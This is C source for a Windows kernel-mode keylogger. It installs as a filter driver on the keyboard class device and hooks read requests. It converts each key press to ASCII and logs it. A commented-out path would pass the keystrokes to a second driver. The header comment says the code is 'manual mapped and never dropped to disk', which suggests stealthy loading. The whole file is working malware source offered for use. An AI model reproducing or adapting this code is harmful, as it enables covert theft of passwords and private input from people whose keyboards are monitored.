/*..
*
* This was made a long ass time ago...
* this is manual mapped and never dropped to disk really
*/
#include <ntddk.h>
#include <Wdm.h>
#include <ntddkbd.h>
#define MAIN_DEVICE_NAME L"\\Device\\HandleResponse"
#define KEYBOARD_CLASS_DEVICENAME L"\\Device\\KeyboardClass0"

typedef struct _DEVICE_EXTENSION {
	HANDLE ConfigureDriver;
	PDEVICE_OBJECT pKeyboardDevice;
} DEVICE_EXTENSION, *PDEVICE_EXTENSION;

#define INVALID 0X00 
#define SPACE 0X01 
#define ENTER 0X02 
#define LSHIFT 0x03 
#define RSHIFT 0x04 
#define CTRL  0x05 
#define ALT	  0x06 
#define RIGHT_ALT_PRESSED               0x0001
#define LEFT_ALT_PRESSED                0x0002
#define RIGHT_CTRL_PRESSED              0x0004
#define LEFT_CTRL_PRESSED               0x0008
#define SHIFT_PRESSED                   0x0010
#define NUMLOCK_ON                      0x0020
#define SCROLLLOCK_ON                   0x0040
#define CAPSLOCK_ON                     0x0080
#define ENHANCED_KEY                    0x0100
// fucking taken from reactos..
typedef struct _CONVERT_SCAN_CODE {
	USHORT ScanCode;
	USHORT Enhanced;
	UCHAR Normal;
	UCHAR Shift;
	UCHAR NumLock;
	UCHAR bCAPS;
} CONVERT_SCAN_CODE, *PCONVERT_SCAN_CODE;

CONVERT_SCAN_CODE SCAN_CODE_MAP[] = {
	{ 0x1e,	0,	'a',	'A',	0, TRUE },
	{ 0x30,	0,	'b',	'B',	0, TRUE },
	{ 0x2e,	0,	'c',	'C',	0, TRUE },
	{ 0x20,	0,	'd',	'D',	0, TRUE },
	{ 0x12,	0,	'e',	'E',	0, TRUE },
	{ 0x21,	0,	'f',	'F',	0, TRUE },
	{ 0x22,	0,	'g',	'G',	0, TRUE },
	{ 0x23,	0,	'h',	'H',	0, TRUE },
	{ 0x17,	0,	'i',	'I',	0, TRUE },
	{ 0x24,	0,	'j',	'J',	0, TRUE },
	{ 0x25,	0,	'k',	'K',	0, TRUE },
	{ 0x26,	0,	'l',	'L',	0, TRUE },
	{ 0x32,	0,	'm',	'M',	0, TRUE },
	{ 0x31,	0,	'n',	'N',	0, TRUE },
	{ 0x18,	0,	'o',	'O',	0, TRUE },
	{ 0x19,	0,	'p',	'P',	0, TRUE },
	{ 0x10,	0,	'q',	'Q',	0, TRUE },
	{ 0x13,	0,	'r',	'R',	0, TRUE },
	{ 0x1f,	0,	's',	'S',	0, TRUE },
	{ 0x14,	0,	't',	'T',	0, TRUE },
	{ 0x16,	0,	'u',	'U',	0, TRUE },
	{ 0x2f,	0,	'v',	'V',	0, TRUE },
	{ 0x11,	0,	'w',	'W',	0, TRUE },
	{ 0x2d,	0,	'x',	'X',	0, TRUE },
	{ 0x15,	0,	'y',	'Y',	0, TRUE },
	{ 0x2c,	0,	'z',	'Z',	0, TRUE },

	{ 0x02,	0,	'1',	'!',	0, FALSE },
	{ 0x03,	0,	'2',	'@',	0, FALSE },
	{ 0x04,	0,	'3',	'#',	0, FALSE },
	{ 0x05,	0,	'4',	'$',	0, FALSE },
	{ 0x06,	0,	'5',	'%',	0, FALSE },
	{ 0x07,	0,	'6',	'^',	0, FALSE },
	{ 0x08,	0,	'7',	'&',	0, FALSE },
	{ 0x09,	0,	'8',	'*',	0, FALSE },
	{ 0x0a,	0,	'9',	'(',	0, FALSE },
	{ 0x0b,	0,	'0',	')',	0, FALSE },

	{ 0x29,	0,	'\'',	'~',	0, FALSE },
	{ 0x0c,	0,	'-',	'_',	0, FALSE },
	{ 0x0d,	0,	'=',	'+',	0, FALSE },
	{ 0x1a,	0,	'[',	'{',	0, FALSE },
	{ 0x1b,	0,	']',	'}',	0, FALSE },
	{ 0x2b,	0,	'\\',	'|',	0, FALSE },
	{ 0x27,	0,	';',	':',	0, FALSE },
	{ 0x28,	0,	'\'',	'"',	0, FALSE },
	{ 0x33,	0,	',',	'<',	0, FALSE },
	{ 0x34,	0,	'.',	'>',	0, FALSE },
	{ 0x35,	0,	'/',	'?',	0, FALSE },

	{ 0x4f,	0,	0,	0,	'1', FALSE },
	{ 0x50,	0,	0,	0,	'2', FALSE },
	{ 0x51,	0,	0,	0,	'3', FALSE },
	{ 0x4b,	0,	0,	0,	'4', FALSE },
	{ 0x4c,	0,	0,	0,	'5', FALSE },
	{ 0x4d,	0,	0,	0,	'6', FALSE },
	{ 0x47,	0,	0,	0,	'7', FALSE },
	{ 0x48,	0,	0,	0,	'8', FALSE },
	{ 0x49,	0,	0,	0,	'9', FALSE },
	{ 0x52,	0,	0,	0,	'0', FALSE },

	{ 0x4a,	0,	'-',	'-',	0, FALSE },
	{ 0x4e,	0,	'+',	'+',	0, FALSE },
	{ 0x37,	0,	'*',	'*',	0, FALSE },
	{ 0x35,	1,	'/',	'/',	0, FALSE },
	{ 0x53,	0,	0,	0,	'.', FALSE },

	{ 0x39,	0,	' ',	' ',	0, FALSE },

	{ 0x1c,	0,	'\r',	'\r',	0, FALSE },
	{ 0x1c,	1,	'\r',	'\r',	0, FALSE },
	{ 0x0e,	0,	0x08,	0x08,	0, FALSE }, // backspace

	{ 0,	0,	0,	0,	0, FALSE }
};

UCHAR ConvertToASCII(USHORT InputData, ULONG KeyState)
{
	SIZE_T Counter = 0;
	USHORT Enhanced = 0;

	if (KeyState & ENHANCED_KEY) Enhanced = 1;

	while (SCAN_CODE_MAP[Counter].ScanCode != 0) {
		if ((SCAN_CODE_MAP[Counter].ScanCode == InputData) &&
			(SCAN_CODE_MAP[Counter].Enhanced == Enhanced)) {
			if (SCAN_CODE_MAP[Counter].NumLock) {
				if ((KeyState & NUMLOCK_ON) &&
					!(KeyState & SHIFT_PRESSED)) {
					return SCAN_CODE_MAP[Counter].NumLock;
				}
				else {
					return SCAN_CODE_MAP[Counter].Normal;
				}
			}

			if ((KeyState & CAPSLOCK_ON) && SCAN_CODE_MAP[Counter].bCAPS)
				KeyState ^= SHIFT_PRESSED;

			if (KeyState & SHIFT_PRESSED)
				return SCAN_CODE_MAP[Counter].Shift;

			return SCAN_CODE_MAP[Counter].Normal;
		}
		Counter++;
	}

	return 0;
}


NTSTATUS ConfigureDriver(HANDLE hDriver) {
	POBJECT_ATTRIBUTES ObjAttr = NULL;
	PIO_STATUS_BLOCK pIoStatusBlock = NULL;
	UNICODE_STRING ObjectName = RTL_CONSTANT_STRING(MAIN_DEVICE_NAME);
	InitializeObjectAttributes(ObjAttr, &ObjectName, OBJ_KERNEL_HANDLE, NULL, NULL);
	NTSTATUS status = ZwCreateFile(&hDriver,
		GENERIC_WRITE, ObjAttr, pIoStatusBlock, NULL,
		FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN, FILE_SYNCHRONOUS_IO_ALERT, NULL, 0);
	return status;
}

NTSTATUS ZwWaitForSingleObject(
	_In_     HANDLE         Handle,
	_In_     BOOLEAN        Alertable,
	_In_opt_ PLARGE_INTEGER Timeout
);
NTSTATUS SendDataToDriver(_In_ HANDLE hDriver, PUCHAR pData, ULONG ulData) {
	IO_STATUS_BLOCK IoStatusBlock;
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	status = ZwWriteFile(hDriver, NULL, NULL, NULL, &IoStatusBlock, pData, ulData, NULL, NULL);
	if (status == STATUS_PENDING) {
		status = ZwWaitForSingleObject(hDriver, FALSE, NULL);
		if (NT_SUCCESS(status)) {
			status = IoStatusBlock.Status;
		}
	}
	if (NT_SUCCESS(status)) {
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Status Success\n");
	}
	return status;
}
NTSTATUS CompletionRoutine(_In_ PDEVICE_OBJECT pDeviceObject, _In_ PIRP pIrp, _In_ PVOID Ctx)
{
	UNREFERENCED_PARAMETER(Ctx);
	UNREFERENCED_PARAMETER(pDeviceObject);
	PIO_STACK_LOCATION pIoStackLocation = IoGetCurrentIrpStackLocation(pIrp);
	if ((pIrp->IoStatus.Status == STATUS_SUCCESS) && (pIoStackLocation->MajorFunction == IRP_MJ_READ) && (pIrp->Flags & IRP_BUFFERED_IO))
	{
		PKEYBOARD_INPUT_DATA pKeyboardInputData = (PKEYBOARD_INPUT_DATA)pIrp->AssociatedIrp.SystemBuffer;
		SIZE_T stKeys = pIrp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);
		do {
			if (pKeyboardInputData->Flags & KEY_BREAK) {
				UCHAR KeyStroke = ConvertToASCII(pKeyboardInputData->MakeCode, pKeyboardInputData->Flags);
				DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "KeyStroke: %c\n", KeyStroke);
				//		SendDataToDriver(((PDEVICE_EXTENSION)pDeviceObject->DeviceExtension)->ConfigureDriver, &KeyStroke, 1);
			}
		} while (pKeyboardInputData++, --stKeys);
	}
	if (pIrp->PendingReturned)
		IoMarkIrpPending(pIrp);

	return pIrp->IoStatus.Status;
}

NTSTATUS IRP_Read(_In_ PDEVICE_OBJECT pDeviceObject, _In_ PIRP pIrp)
{
	IoCopyCurrentIrpStackLocationToNext(pIrp);
	IoSetCompletionRoutine(pIrp, CompletionRoutine, pDeviceObject, TRUE, TRUE, TRUE);
	return IoCallDriver(((PDEVICE_EXTENSION)pDeviceObject->DeviceExtension)->pKeyboardDevice, pIrp);

}


NTSTATUS IRP_Skip(_In_ PDEVICE_OBJECT pDeviceObject, _In_ PIRP pIrp)
{
	IoSkipCurrentIrpStackLocation(pIrp);
	return IoCallDriver(((PDEVICE_EXTENSION)pDeviceObject->DeviceExtension)->pKeyboardDevice, pIrp);
}



VOID DriverUnload(_In_ PDRIVER_OBJECT pDriverObject)
{
	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;
	IoDetachDevice(pKeyboardDeviceExtension->pKeyboardDevice);
	IoDeleteDevice(pDriverObject->DeviceObject);
	return;
}
// 
NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT  pDriverObject, _In_ PUNICODE_STRING psRegistryPath)
{
	UNREFERENCED_PARAMETER(psRegistryPath);
	PDEVICE_OBJECT pDeviceObject;
	for (SIZE_T i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++) {
		pDriverObject->MajorFunction[i] = IRP_Skip;
	}
	pDriverObject->MajorFunction[IRP_MJ_READ] = IRP_Read;
	NTSTATUS status = IoCreateDevice(pDriverObject, sizeof(DEVICE_EXTENSION), NULL, FILE_DEVICE_KEYBOARD, 0, TRUE, &pDeviceObject);
	if (!NT_SUCCESS(status))
		return status;
	pDeviceObject->Flags |= (DO_BUFFERED_IO | DO_POWER_PAGABLE);
	pDeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;
	RtlZeroMemory(pDeviceObject->DeviceExtension, sizeof(DEVICE_EXTENSION));
	PDEVICE_EXTENSION pDeviceExtension = (PDEVICE_EXTENSION)pDeviceObject->DeviceExtension;
	UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(KEYBOARD_CLASS_DEVICENAME);
	IoAttachDevice(pDeviceObject, &DeviceName, &pDeviceExtension->pKeyboardDevice);
	pDriverObject->DriverUnload = DriverUnload;
	//	ConfigureDriver(((PDEVICE_EXTENSION)pDeviceObject->DeviceExtension)->ConfigureDriver);
	return STATUS_SUCCESS;
}